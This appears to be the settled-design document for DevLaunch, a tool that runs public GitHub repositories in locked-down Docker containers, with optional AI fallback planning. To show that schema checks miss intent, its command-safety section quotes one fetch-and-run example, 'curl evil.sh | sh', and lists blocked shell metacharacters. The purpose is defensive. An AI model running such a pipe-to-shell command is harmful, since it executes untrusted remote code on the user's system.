# Planning Strategy — Settled Decisions

Ground truth for the DevLaunch build. Every decision here was settled in design
review before Phase 1. Deviating from one is a design change, not an implementation
detail — update this document in the same commit.

## Ship target

**v1.0 ships with zero AI.** Phases 1–7 + 9–10 form a complete, demoable system.
The `AIProvider` interface is defined from Phase 1 so Phase 8 (AI fallback planner +
repair) is purely additive.

One deliberately-unrecognizable fixture repo is built early, so the AI fallback path
has something to demonstrate the day it exists. An AI path that never triggers in a
demo is worse than no AI path.

## Plan generation

- **Rule-based is the primary path.** Deterministic mapping from manifest files to a
  Run Plan, zero model calls.
- **AI is fallback only**, triggered on `UNRECOGNIZED`, and its output passes through
  the exact same validation and sandboxing.
- Every plan carries `planSource: "rule-based" | "ai-fallback"`.

### Detector roster

`React` is **not** a detector — it is a library, not a runtime or dev server. Detect
the actual dev server instead:

| Signal | Type | Notes |
|---|---|---|
| `vite` dependency | Node + Vite | |
| `next` dependency | Node + Next.js | |
| `react-scripts` dependency | Node + CRA | Common on older repos; was missing from the original plan |
| `webpack-dev-server` dependency | Node + Webpack | |
| `express`, no frontend framework | Node + Express | |
| `manage.py` present | Python + Django | |
| `requirements.txt` + Flask import | Python + Flask | |

### Monorepos

Handled by a narrow deterministic rule, **not** routed to AI. If `workspaces` or
`pnpm-workspace.yaml` exists, find packages with a `dev`/`start` script:

- Exactly one candidate → use it.
- More than one → **ask the user to pick in the UI** (state `AWAITING_INPUT`).

A human picking from a list beats a model guessing, and it is less code.

## Execution model

**Generic allowlisted base image, repo copied in. Repo Dockerfiles are ignored in v1.**

Building a repository's own Dockerfile executes arbitrary `RUN` at build time — the
precise untrusted-code execution the sandbox exists to contain — and it makes the Run
Plan incoherent, because the Dockerfile *becomes* the plan.

**Copy in, never bind-mount.** On Colima's virtiofs, a writable host mount plus a
non-root container user is a permissions minefield, and it lets untrusted code write
into the host clone.

### Container lifecycle

```
docker create  →  docker cp (repo + wrapper)  →  docker start  →  stream docker logs
```

The entrypoint is a **static wrapper script** that runs install → build → start,
emitting phase sentinels to stdout and exiting with a distinct code per phase. This
gives one clean process lifecycle, native log streaming, and unambiguous failure
attribution all at once.

Commands reach the wrapper through **environment variables, never string
interpolation** into the script body. The script is byte-identical on every run.

The start command is `exec`d so signals reach the application, and containers run
with `--init` for correct PID 1 semantics and zombie reaping.

### Base images

**`-slim` (glibc), never Alpine.** musl breaks native modules, and Vite depends on
esbuild. Images are allowlisted; the allowlist is frozen at module load.

DevLaunch builds its **own** runner images (`docker/runner/`, built by
`scripts/build-runner-images.sh`) rather than running stock upstream ones, because a
runner image must pre-create `/workspace` owned by the non-root user. An anonymous
volume inherits ownership from the image path it shadows, so a volume over a path the
image does not create mounts **root-owned** — and a non-root process then cannot write
to it at all.

One **"fat" Node image including `build-essential` + `python3`** is shipped so
`node-gyp` source builds succeed — this converts a whole class of hard ARM failures
into successes.

No per-run image builds in v1. A **named volume caches npm/pip downloads** across
runs, which captures most of the speed benefit without BuildKit complexity.

## Sandbox policy

| Control | Setting |
|---|---|
| Root filesystem | Read-only |
| Writable area | Volume at `/workspace`, with npm cache and `HOME` redirected there |
| Scratch space | tmpfs at `/tmp`, `noexec,nosuid` |
| Memory | 1 GB per container |
| Concurrency | **1 session** |
| Network | General egress allowed; **RFC1918 and 169.254.0.0/16 blocked** |
| Capabilities | `capDrop ALL` |
| User | Non-root |
| Docker socket | Never mounted |

Read-only root plus a writable `/workspace` resolves the original plan's
contradiction between "read-only root filesystem" and "run `npm install`".

Two consequences of `ReadonlyRootfs` that only surfaced under test:

- The Docker API refuses **any** `docker cp` whose extraction target is the rootfs
  ("container rootfs is marked read-only"), even while the container is stopped. Every
  copy must therefore extract at the `/workspace` volume, which is a separate mount and
  does accept writes.
- Host ownership and permissions carry through the tar archive verbatim. A staging
  directory created at `mkdtemp`'s default `0700` arrives as `drwx------` owned by the
  host uid, and the container user cannot traverse it. Copies now normalise ownership
  to the container user and grant group/other whatever read/execute the owner has —
  never write.

Egress must stay open for package registries — restricting it would require a MITM
proxy, which is out of scope. Blocking private ranges is achievable and meaningful:
it stops untrusted containers reaching the LAN or cloud metadata endpoints. The
security docs claim only what is actually implemented.

### Two chains are required, not one

`scripts/setup-network-policy.sh` installs the policy. It needs **both** an egress
chain jumped to from `DOCKER-USER` and an input chain jumped to from `INPUT`:

- `DOCKER-USER` sees only **forwarded** traffic — packets passing *through* the VM
  toward another host.
- A packet from a container to the VM itself, **its own default gateway included**,
  terminates locally and hits `INPUT`. `DOCKER-USER` never sees it.

With only the forward chain, a container could still reach every service listening on
the VM host. This was caught by a test asserting the gateway times out: the probe
reported `refused`, which proves the gateway answered.

Both chains begin with a conntrack `ESTABLISHED,RELATED` return, without which replies
to published ports are dropped — the reply travels back toward the Docker gateway,
which is itself inside a blocked range. Outbound internet traffic is unaffected by the
input chain, since that path is `FORWARD` plus `POSTROUTING` masquerade.

## Ports and host binding

**Force first, discover as fallback.**

Vite, Flask, and Django bind `127.0.0.1` by default. Inside a container that makes
Docker's port mapping resolve to nothing — connection refused for a perfectly healthy
app. The planner therefore **rewrites start commands** to force `0.0.0.0`:

| Framework | Normalization |
|---|---|
| Vite | `--host 0.0.0.0 --port 5173` |
| Next.js | `-H 0.0.0.0 -p 3000` |
| CRA | `HOST=0.0.0.0 PORT=3000` |
| Flask | `--host=0.0.0.0 --port=5000` |
| Django | `0.0.0.0:8000` |
| Express | inject `PORT` / `HOST` env |

When an app ignores that, publish all ports (`-P`) and read the container's own
listening sockets from `/proc/net/tcp`. That is container introspection, not host port
scanning, so it does not violate the "never scan host ports" rule.

`PORT_BOUND_TO_LOCALHOST` is a **distinct failure class** from `PORT_NOT_LISTENING`:
it will be the most common real failure and its remedy is completely different.

## Readiness

**READY = TCP connect succeeds AND a complete HTTP response is returned — any status,
including 3xx/4xx/5xx.**

`expectedStatusCodes` is retained but **demoted from a gate to a displayed health
hint**. An app redirecting `/` to `/login` returns 302; an API with no root route
returns 404. Both are running fine. Never fail a run over a status code.

## Command safety

**Allowlist grammar, applied identically to both plan sources.** Schema validation
checks shape, not intent: `startCommand: "curl evil.sh | sh"` passes Zod perfectly.

- Commands must resolve to an allowlisted binary (`npm`, `yarn`, `pnpm`, `node`,
  `python`, `pip`, `flask`, `gunicorn`, `uvicorn`, `next`, `vite`).
- **Every shell metacharacter is rejected** (`;`, `|`, `&`, backtick, `$(`, `>`, newline).
- Execution is via exec-array — no shell at the composition layer.
- README and manifest text entering an AI prompt is explicitly delimited and labelled
  untrusted.

### Script bodies are NOT inspected

`npm run dev` executes whatever `scripts.dev` contains. Body inspection is security
theatre: real dev scripts chain commands (`tsc && vite build`), so banning
metacharacters there would reject most legitimate repositories while stopping nothing
a container does not already stop.

Instead, the **resolved script body is displayed in the UI before execution** —
informed consent rather than false assurance.

> The allowlist constrains what DevLaunch composes.
> The container constrains what the repository does.

This applies to rule-based plans too. They derive from `package.json`, which is
attacker-controlled; the deterministic path is not inherently safer, and the docs say
so plainly.

## AI repair blast radius

**Plan deltas only. Never file edits.**

Repair may modify a fixed whitelist of fields — `installCommand`, `buildCommand`,
`startCommand`, `expectedPort`, `environmentVariables`, `runtime.version`,
`healthCheck.path` — and nothing else. Output is re-validated through the same
allowlist.

Maximum 2 attempts, and **each attempt must differ from the previous one**, so a
confidently-wrong model cannot burn both retries on identical output.

## Timeouts and session lifetime

The original plan's single ~10-minute budget would kill a READY application while the
user was still using it. The clock is **split**:

- **Time-to-ready budget (~10 min):** clone + install + build + start + readiness.
- **Session lifetime, starting at READY:** 30 min idle timeout, 60 min hard cap, with
  a visible Stop button and countdown. An idle reaper collects abandoned sessions.

## State and logging

**In-memory only. No database.** A `Map` of sessions and a ring buffer. Sessions die
on restart, which is correct for a single-user local tool at concurrency 1. SQLite is
scope we do not need.

Log buffer is capped by **bytes first, lines second** (~5 MB or 10k lines, whichever
hits first) with an explicit truncation marker. A webpack build can emit 10k lines
exceeding 50 MB — capping by line count alone is an OOM in our own backend.

On WebSocket reconnect the client sends its last sequence number; the server replays
from there, or sends a gap marker if those entries were evicted.

## Environment variables

**Pre-flight gate, not discover-by-failing.** After analysis, if `.env.example`
declares variables with no default, execution pauses in state `AWAITING_INPUT` and
collects them in the UI. The gate is skippable.

Values live in memory only, are never written to disk, and are injected at container
create time.

## Repository intake

- `--depth 1 --single-branch`, `--no-recurse-submodules`, `GIT_LFS_SKIP_SMUDGE=1`
- Hard caps: **~500 MB and ~20k files**, aborting mid-clone when exceeded
- **Public HTTPS on `github.com` only.** No `ssh://`, no other hosts, nothing
  requiring credentials — this keeps the threat model tight
- Clone into a dedicated temp root so cleanup's `rm -rf` can never escape
- Failure class: `REPOSITORY_TOO_LARGE`

## Architecture

**Native arm64 only — no qemu emulation** (slow and flaky under Colima, and it would
blow the timeouts).

Failure class `ARCH_INCOMPATIBLE`, classified from log signatures: `Exec format
error`, `unsupported platform`, `no prebuilt binaries`.

## Fixtures

**Vendored in-repo** under `fixtures/`, as tiny hand-written apps. Deterministic,
offline, fast, and each failure mode is controlled precisely — the "wrong port"
fixture fails *exactly* that way.

Each fixture carries a **snapshot of its expected Run Plan**, so rule-based detection
is assertion-tested rather than eyeballed.

Two or three real GitHub repositories are kept as a **manual smoke list** for demos,
never in the automated suite.

## Toolchain

pnpm workspaces · Vitest · tsx · `engines.node >= 20`.
